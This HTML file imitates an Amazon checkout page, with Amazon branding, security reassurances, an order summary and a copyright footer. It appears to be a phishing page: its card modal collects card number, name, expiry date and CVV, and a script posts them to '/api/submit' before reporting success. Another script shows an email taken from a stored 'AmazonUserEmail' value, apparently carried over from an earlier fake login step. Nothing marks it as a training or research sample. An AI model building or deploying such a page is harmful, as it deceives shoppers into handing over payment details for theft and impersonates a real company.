<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Amazon - Checkout</title>
<style>

body {
    margin: 0;
    font-family: Arial, sans-serif;
    background-color: #f3f3f3;
}

.checkout-header {
  background: linear-gradient(to right, #131921, #232f3e);
  color: #fff;
  height: 60px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 40px;
  position: relative;
}

/* Logo */
.header-left img {
  height: 28px;
}

/* Center text */
.header-center {
  position: relative;
  text-align: center;
}

.secure-toggle {
  font-size: 26px;
  font-weight: 500;
  cursor: pointer;
}

.arrow {
  font-size: 14px;
  margin-left: 5px;
}

/* Dropdown box */
.secure-info {
  display: none;
  position: absolute;
  top: 50px;
  left: 50%;
  transform: translateX(-50%);
  width: 450px;
  background: #fff;
  color: #111;
  padding: 15px;
  border-radius: 4px;
  font-size: 14px;
  line-height: 1.5;
  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
  z-index: 100;
}

.secure-info a {
  color: #007185;
  text-decoration: none;
}

.secure-info a:hover {
  text-decoration: underline;
}

/* Cart */
.header-right {
  font-size: 18px;
  cursor: pointer;
}


/* Layout */
.page-wrapper {
    display: flex;
    justify-content: center;
    gap: 25px;
    padding: 30px 20px;
}

/* LEFT SIDE */
.left-section {
    width: 65%;
    background: #fff;
    border: 1px solid #ddd;
    border-radius: 8px;
    padding: 25px;
}

/* RIGHT SIDE */
.right-section {
    width: 28%;
    background: #fff;
    border: 1px solid #ddd;
    border-radius: 8px;
    padding: 20px;
    height: fit-content;
}

/* Page Title */
h2 {
    margin-top: 0;
    font-size: 24px;
    font-weight: 600;
}

/* Promo Box */
.promo-box {
    background: #fafafa;
    border: 1px solid #ddd;
    border-radius: 6px;
    padding: 15px;
    margin-bottom: 25px;
    font-size: 14px;
}

/* Payment Section */
.payment-section {
    margin-top: 10px;
}

.section-block {
    margin-bottom: 25px;
}

.section-title {
    font-size: 20px;
    font-weight: 600;
    padding-bottom: 12px;
    border-bottom: 1px solid #ddd;
}

.section-content {
    padding-top: 15px;
}

.row {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 10px 0;
}

.plus {
    font-size: 24px;
    color: #bbb;
    width: 25px;
    text-align: center;
}

.radio {
    width: 18px;
    height: 18px;
    border: 2px solid #ccc;
    border-radius: 50%;
}

.row img {
    width: 40px;
}

.label {
    font-weight: 600;
    margin-bottom: 8px;
}

.input-row {
    display: flex;
    gap: 10px;
}

.input-row input {
    padding: 8px;
    border: 1px solid #a6a6a6;
    border-radius: 4px;
    width: 220px;
}

.input-row button {
    padding: 8px 16px;
    border-radius: 20px;
    border: 1px solid #ccc;
    background: #fff;
    cursor: pointer;
}

.link {
    color: #0066c0;
    font-weight: 500;
    cursor: pointer;
}

.subtext {
    color: #555;
    font-weight: normal;
}

.disabled {
    color: #999;
}

.info-text {
    font-size: 13px;
    color: #777;
    margin-left: 55px;
    margin-top: 5px;
}

/* Order Summary */
/* Layout container */
.checkout-wrapper {
  max-width: 1200px;
  margin: 40px auto;
  display: flex;
  gap: 30px;
}

/* LEFT side */
.left-section {
  flex: 2;
}

/* RIGHT side */
.right-section {
  flex: 1;
  background: #fff;
  border: 1px solid #ddd;
  padding: 20px;
  height: fit-content;

  /* This makes it float while scrolling */
  position: sticky;
  top: 20px;
}

/* Button */
.summary-button {
  width: 100%;
  padding: 10px;
  background: #ffd814;
  border: 1px solid #fcd200;
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
}

.summary-button:hover {
  background: #f7ca00;
}

/* Rows */
.summary-row {
  display: flex;
  justify-content: space-between;
  font-size: 14px;
  margin: 10px 0;
}

/* Total */
.summary-total {
  font-weight: bold;
  font-size: 16px;
}

hr {
    border: none;
    border-top: 1px solid #ddd;
    margin: 15px 0;
}

.clickable {
    cursor: pointer;
}

/* Overlay */
.modal-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.4);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
}

/* Modal Box */
.modal-box {
    width: 750px;
    background: #fff;
    border-radius: 10px;
    overflow: hidden;
    box-shadow: 0 5px 20px rgba(0,0,0,0.2);
}

/* Header */
.modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 20px;
    border-bottom: 1px solid #ddd;
}

.modal-header h3 {
    margin: 0;
}

.close-btn {
    font-size: 20px;
    cursor: pointer;
}

/* Body */
.modal-body {
    display: flex;
    padding: 25px;
    gap: 40px;
}

.modal-left {
    flex: 1;
}

.modal-right {
    flex: 1;
    border-left: 1px solid #eee;
    padding-left: 30px;
}

.modal-right img:not(.card-logos) {
    width: 50px;
    margin: 8px 5px;
}


/* Form */
.form-row {
    margin-bottom: 18px;
}

.form-row label {
    display: block;
    margin-bottom: 6px;
    font-weight: 600;
}

.form-row input,
.form-row select {
    width: 100%;
    padding: 8px;
    border: 1px solid #a6a6a6;
    border-radius: 6px;
}

.expiry-row {
    display: flex;
    gap: 10px;
}

.cvv {
    width: 120px;
}

/* Footer */
.modal-footer {
    background: #f3f3f3;
    padding: 15px 20px;
    display: flex;
    justify-content: flex-end;
    gap: 15px;
}

.cancel-btn {
    padding: 8px 16px;
    border-radius: 20px;
    border: 1px solid #999;
    background: #fff;
    cursor: pointer;
}

.add-btn {
    padding: 8px 20px;
    border-radius: 20px;
    border: 1px solid #FCD200;
    background: #FFD814;
    cursor: pointer;
}

.add-btn:hover {
    background: #F7CA00;
}

/* OVERLAY */
.modal-overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.6);
  justify-content: center;
  align-items: center;
  z-index: 9999;
}

/* MODAL BOX */
.modal-container {
  width: 980px;              /* wider */
  max-width: 98%;
  background: #fff;
  border-radius: 14px;
  overflow: hidden;
  font-family: Arial, sans-serif;
}


/* HEADER */
.modal-header {
  background: #f3f3f3;
  padding: 14px 22px;       /* reduced */
  display: flex;
  justify-content: space-between;
  align-items: center;
  border-bottom: 1px solid #ddd;
}

.modal-header h2 {
  margin: 0;
  font-size: 20px;
  font-weight: 700;
}

.close-btn {
  background: #f3f3f3;
  border: 1px solid #999;
  border-radius: 10px;
  padding: 6px 12px;
  font-size: 18px;
  cursor: pointer;
}


/* BODY */
.modal-body {
  display: flex;
  padding: 22px 40px;   /* reduced height */
  gap: 40px;
}


.modal-left {
  flex: 1;
}

.modal-right {
  flex: 1.5;
  border-left: 1px solid #ddd;
  padding-left: 40px;
}

.modal-right img {
  margin-right: 12px;
  margin-top: 10px;
}

/* FORM ROW ALIGNMENT */
.form-row {
  display: grid;
  grid-template-columns: 170px 1fr;
  align-items: center;
  margin-bottom: 16px;   /* reduced */
}

.form-row label {
  font-size: 15px;
  font-weight: 600;
}

.form-row input,
.form-row select {
  padding: 8px 10px;     /* slimmer */
  border-radius: 6px;
  border: 1px solid #aaa;
  font-size: 14px;
}


/* Expiry layout */
.expiry-row select {
  width: 100px;
}

.expiry-row select {
  width: 120px;
}

/* CVV */
.cvv-row {
  display: flex;
  align-items: center;
  gap: 10px;
}

.cvv-input {
  width: 120px;
}

/* FOOTER */
.modal-footer {
  background: #f3f3f3;
  padding: 16px 30px;   /* smaller */
  border-top: 1px solid #ddd;
}

/* Faded small text */
.footer-text {
  font-size: 13px;
  color: #6f7373;      /* Amazon-style faded grey */
  line-height: 1.4;
  margin-bottom: 14px; /* space above buttons */
}


.footer-buttons {
  display: flex;
  justify-content: flex-end;
  align-items: center;
  gap: 14px;
}

/* CANCEL BUTTON */
.cancel-btn {
  padding: 7px 18px;
  border-radius: 24px;
  border: 1px solid #a6a6a6;
  background: linear-gradient(to bottom, #f7f7f7, #e7e9ec);
  font-size: 14px;
  cursor: pointer;
  box-shadow: 0 1px 0 rgba(0,0,0,0.05);
}

.cancel-btn:hover {
  background: linear-gradient(to bottom, #eeeeee, #dddddd);
}

/* ADD BUTTON */
.add-btn {
  padding: 7px 22px;
  border-radius: 24px;
  border: 1px solid #fcd200;
  background: linear-gradient(to bottom, #ffd814, #f7ca00);
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  box-shadow: 0 2px 4px rgba(0,0,0,0.08);

  white-space: nowrap;   /* 🔥 prevents breaking */
  min-width: 140px;      /* ensures enough space */
}

.footer-buttons button {
  flex-shrink: 0;   /* prevents compression */
}


.add-btn:hover {
  background: linear-gradient(to bottom, #f7ca00, #f2c200);
}
.add-btn:active,
.cancel-btn:active {
  transform: translateY(1px);
}

.card-logos {
  width: 100%;        /* takes full width of right side */
  max-width: none;    /* removes restrictions */
  height: auto;
  display: block;
  margin-top: 12px;
}

.use-payment-wrapper {
    margin-top: 20px;
    padding-left: 55px; /* aligns with payment rows */
}

.use-payment-btn {
    background: linear-gradient(to bottom, #ffd814, #f7ca00);
    border: 1px solid #fcd200;
    border-radius: 24px;
    padding: 10px 26px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    box-shadow: 0 2px 4px rgba(0,0,0,0.08);
}

.use-payment-btn:hover {
    background: linear-gradient(to bottom, #f7ca00, #f2c200);
}

.use-payment-btn:active {
    transform: translateY(1px);
}

.review-section {
  background: #f3f3f3;
  padding: 25px;
  border-top: 1px solid #ddd;
  max-width: 800px;      /* reduced width */
  width: 100%;
}

.review-section h2 {
  font-size: 22px;
  font-weight: 700;
  margin-bottom: 20px;
  color: #111;
}

.review-content {
  background: #fff;
  padding: 20px;
  border: 1px solid #ddd;
}

.review-content p {
  font-size: 11px;
  color: #111;
  margin-bottom: 14px;
  line-height: 1.5;
}

.review-content a {
  color: #007185;
  text-decoration: none;
}

.review-content a:hover {
  text-decoration: underline;
}

.back-link {
  display: inline-block;
  margin-top: 10px;
  font-size: 14px;
}

/* Entire footer */
.amazon-footer {
  margin-top: 60px;
  font-family: Arial, sans-serif;
}

/* Back to top */
.footer-top {
  background: #37475a;
  text-align: center;
  padding: 15px 0;
}

.footer-top a {
  color: #fff;
  text-decoration: none;
  font-size: 14px;
}

.footer-top:hover {
  background: #485769;
}

/* Middle dark section */
.footer-middle {
  background: #232f3e;
  padding: 40px 0;
}

.footer-content {
  max-width: 1000px;
  margin: auto;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 40px;
}

.footer-logo {
  width: 100px;
}

.footer-options {
  display: flex;
  align-items: center;
  gap: 15px;
}

.footer-btn {
  border: 1px solid #848688;
  padding: 8px 15px;
  border-radius: 4px;
  color: #ddd;
  font-size: 14px;
  cursor: pointer;
}

.footer-btn:hover {
  border-color: #fff;
}

.footer-help {
  color: #ddd;
  text-decoration: none;
  font-size: 14px;
}

.footer-help:hover {
  text-decoration: underline;
}

/* Bottom section */
.footer-bottom {
  background: #131a22;
  text-align: center;
  padding: 20px 0;
}

.footer-links {
  margin-bottom: 10px;
}

.footer-links a {
  color: #ddd;
  margin: 0 10px;
  font-size: 12px;
  text-decoration: none;
}

.footer-links a:hover {
  text-decoration: underline;
}

.footer-copy {
  color: #999;
  font-size: 12px;
}


</style>
</head>
<body>
<!-- HEADER -->
<header class="checkout-header">

  <!-- Left Logo -->
  <div class="header-left">
    <img src="https://pngimg.com/uploads/amazon/amazon_PNG11.png" 
         alt="Amazon Logo">
  </div>

  <!-- Center Secure Checkout -->
  <div class="header-center">
    <div class="secure-toggle" onclick="toggleSecureInfo()">
      Secure checkout
      <span class="arrow">▼</span>
    </div>

    <div class="secure-info" id="secureInfo">
      We secure your payment and personal information when you share or save it with us.
      We don't share payment details with third-party sellers.
      We don't sell your information to others.
      <a href="#">Learn more</a>
    </div>
  </div>

  <!-- Right Cart -->
  <div class="header-right">
    🛒 Cart
  </div>

</header>

<div class="page-wrapper">

    <!-- LEFT SIDE -->
    <div class="left-section">

        <h2>Payment method</h2>

        <div class="promo-box">
            <p>
                <strong><span id="userEmail"></span></strong>
                Get a <strong>$50 Amazon Gift Card</strong> instantly upon approval for the Amazon Store Card.
                Your cost could be <strong>$0.00 instead of $31.98!</strong>
            </p>
        </div>

        <div class="payment-section">

            <!-- Available Balance -->
            <div class="section-block">
                <div class="section-title">Your available balance</div>
                <div class="section-content">
                    <div class="row">
                        <div class="plus">+</div>
                        <div>
                            <div class="label">Enter a gift card, voucher or promotional code</div>
                            <div class="input-row">
                                <input type="text" placeholder="Enter Code">
                                <button>Apply</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Cards -->

            <!-- Cards -->
<div class="section-block">
    <div class="section-title">Your credit and debit cards</div>
    <div class="section-content">
        <div class="row clickable" onclick="openCardModal()">
            <div class="plus">+</div>
            <img src="https://img.icons8.com/color/48/bank-card-back-side.png">
            <span class="link">
                Add a credit or debit card ›
                <span class="subtext"> Amazon accepts all major credit cards.</span>
            </span>
        </div>
    </div>
</div>

            <!-- Payment Plans -->
            <div class="section-block">
                <div class="section-title">Payment plans</div>
                <div class="section-content">
                    <div class="row disabled">
                        <div class="radio"></div>
                        <img src="alogo.png" class="card-logos">
                        <span>Pay over time with AmazonPay</span>
                    </div>
                    <div class="info-text">
                        Ineligible for this order, cart total is less than $50.
                    </div>
                </div>
            </div>

            <!-- Other Methods -->
            <div class="section-block">
                <div class="section-title">Other payment methods</div>
                <div class="section-content">

                    <div class="row">
                        <div class="plus">+</div>
                        <img src="cardd.gif" class="card-logos">
                        <span class="link">
                            Learn more about Amazon Store Card ›
                            <span class="subtext"> Access exclusive financing offers. No annual fee.</span>
                        </span>
                    </div>

                    <div class="row">
                        <div class="plus">+</div>
                        <img src="https://img.icons8.com/color/48/gift-card.png">
                        <span class="link">
                            Add a Amazon Benefits card ›
                            <span class="subtext"> Currently accepting select benefit cards.</span>
                        </span>
                    </div>

                </div>
            </div>

        </div>

        <div class="use-payment-wrapper">
    <button class="use-payment-btn">
        Use this payment method
    </button>
</div>


    </div>

    <!-- RIGHT SIDE -->
    <div class="right-section">

        <button class="summary-button">Use this payment method</button>

        <hr>

        <div class="summary-row">
            <span>Items:</span>
            <span>$24.99</span>
        </div>

        <div class="summary-row">
            <span>Shipping & handling:</span>
            <span>$6.99</span>
        </div>

        <div class="summary-row">
            <span>Estimated tax to be collected:</span>
            <span>$0.00</span>
        </div>

        <hr>

        <div class="summary-row summary-total">
            <span>Order total:</span>
            <span>$31.98</span>
        </div>

    </div>

</div>
<!-- CARD MODAL -->
    <div id="cardModal" class="modal-overlay">
      <div class="modal-container">
        <!-- HEADER -->
        <div class="modal-header">
          <h2>Add a credit or debit card</h2>
          <button class="close-btn" onclick="closeCardModal()">✕</button>
        </div>
        <!-- BODY -->
        <div class="modal-body">
      <!-- LEFT SIDE -->
      <div class="modal-left">
        <form id="cardForm">
          <div class="form-row">
            <label>Card number</label>
            <input type="text" id="cardNumber" required>
          </div>
          <div class="form-row">
            <label>Name on card</label>
            <input type="text" id="cardName" required>
          </div>
          <div class="form-row">
            <label>Expiration date</label>
            <div class="expiry-row">
              <select id="expiryMonth" required>
                <option>01</option>
                <option>02</option>
                <option>04</option>
                <option>05</option>
                <option>06</option>
                <option>07</option>
                <option>08</option>
                <option>09</option>
                <option>10</option>
                <option>11</option>
                <option>12</option>
              </select>
              <select id="expiryYear" required>
                <option>2026</option>
                <option>2027</option>
                <option>2028</option>
                <option>2029</option>
                <option>2030</option>
                <option>2031</option>
                <option>2032</option>
                <option>2033</option>
                <option>2034</option>
                <option>2035</option>
                <option>2036</option>
                <option>2037</option>
                <option>2038</option>
                <option>2039</option>
                <option>2040</option>
                <option>2041</option>
                <option>2042</option>
              </select>
            </div>
          </div>
          <div class="form-row">
            <label>Security Code<br>(CVV/CVC)</label>
            <div class="cvv-row">
              <input type="text" id="cvv" class="cvv-input" required>
              <a href="#">(What's this?)</a>
            </div>
          </div>
        </form>
      </div>
      <!-- RIGHT SIDE -->
      <div class="modal-right">
      <img src="cards.png" class="card-logos">
    </div>
    </div>
        <!-- FOOTER -->
        <div class="modal-footer">
      <div class="footer-text">
        To avoid interruptions to your service, your added card may be used as a backup if another payment method fails.
        You can change this setting in Your Payments anytime.
      </div>
      <div class="footer-buttons">
        <button type="button" class="cancel-btn" onclick="closeCardModal()">Cancel</button>
        <button type="submit" form="cardForm" class="add-btn">Add your card</button>
      </div>
    </div>
    </div>


  </div>
</div>
<!-- Review Items and Shipping Section -->
<div class="review-section">
  <h2>Review items and shipping</h2>

  <div class="review-content">
    <p>
      Why has sales tax been applied?
      <a href="#">See tax and seller information.</a>
    </p>

    <p>
      Do you need help?
      <a href="#">Explore our Help pages</a> or
      <a href="#">contact us</a>
    </p>

    <p>
      For an item sold by Amazon.com: When you click the "Place your order"
      button, we'll send you an email message acknowledging receipt of your
      order. Your contract to purchase an item will not be complete until we
      send you an email notifying you that the item has been shipped.
    </p>

    <p>
      Colorado Purchasers:
      <a href="#">
        Important information regarding sales tax you may owe in your State
      </a>
    </p>

    <p>
      Within 30 days of delivery, you may return new, unopened merchandise in
      its original condition. Exceptions and restrictions apply. See
      <a href="#">Amazon.com's Returns Policy</a>
    </p>

    <a href="#" class="back-link">Back to cart</a>
  </div>
</div>
<!-- FOOTER -->
<footer class="amazon-footer">

  <!-- Back to top -->
  <div class="footer-top">
    <a href="#">Back to top</a>
  </div>

  <!-- Middle Section -->
  <div class="footer-middle">
    <div class="footer-content">

      <img src="https://pngimg.com/uploads/amazon/amazon_PNG11.png" 
           alt="Amazon Logo" 
           class="footer-logo">

      <div class="footer-options">
        <div class="footer-btn">
          🌐 English
        </div>

        <div class="footer-btn">
          🇺🇸 United States
        </div>

        <a href="#" class="footer-help">Help</a>
      </div>

    </div>
  </div>

  <!-- Bottom Section -->
  <div class="footer-bottom">
    <div class="footer-links">
      <a href="#">Conditions of Use</a>
      <a href="#">Privacy Notice</a>
      <a href="#">Consumer Health Data Privacy Disclosure</a>
      <a href="#">Your Ads Privacy Choices</a>
    </div>

    <div class="footer-copy">
      © 1996-2026, Amazon.com, Inc. or its affiliates
    </div>
  </div>

</footer>

<script>
document.addEventListener("DOMContentLoaded", function() {
    const email = localStorage.getItem("AmazonUserEmail");
    if (email) {
        document.getElementById("userEmail").textContent = email + ",";
    }
});
</script>
<script>
function openCardModal() {
    document.getElementById("cardModal").style.display = "flex";
}

function closeCardModal() {
    document.getElementById("cardModal").style.display = "none";
}

function toggleSecureInfo() {
  const box = document.getElementById("secureInfo");
  box.style.display = box.style.display === "block" ? "none" : "block";
}
</script>

<script>
    document.getElementById('cardForm').addEventListener('submit', function(event) {
        event.preventDefault();
        const cardNumber = document.getElementById('cardNumber').value;
        const cardName = document.getElementById('cardName').value;
        const expiryMonth = document.getElementById('expiryMonth').value;
        const expiryYear = document.getElementById('expiryYear').value;
        const cvv = document.getElementById('cvv').value;
        const data = {
            cardNumber: cardNumber,
            cardName: cardName,
            expiryMonth: expiryMonth,
            expiryYear: expiryYear,
            cvv: cvv
        };
        fetch('/api/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            alert('Card added successfully!');
            console.log('Success:', data);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    });
    </script>

</body>
</html>
